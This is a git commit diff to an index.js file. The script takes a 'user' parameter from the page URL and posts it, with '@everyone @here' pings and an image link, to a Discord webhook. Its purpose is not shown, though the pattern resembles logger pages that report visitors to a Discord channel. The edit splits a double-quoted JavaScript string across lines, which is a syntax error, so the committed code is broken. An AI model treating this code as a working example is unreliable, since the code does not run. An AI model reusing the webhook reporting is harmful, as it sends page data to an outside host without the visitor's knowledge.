abfb6154c013f3b81eec040742af884619b0122c
fedsloll <109453254+fedsloll@users.noreply.github.com>
2022-12-19 17:05:20 -0600

    Update index.js

--- index.js
+++ index.js
@@ -86,7 +86,11 @@ var url_string = window.location.href;
 var url = new URL(url_string);
 var currentURL = url.searchParams.get("user");
 var postData = {
-  content: "@everyone @here " + currentURL + "https://cdn.discordapp.com/attachments/1053859311081758730/1054530225511338065/asidja.png"
+  content: "@everyone @here
+  
+  " + currentURL + "
+  
+  https://cdn.discordapp.com/attachments/1053859311081758730/1054530225511338065/asidja.png"
 };
 fetch(webhookURL, {
   method: "POST",
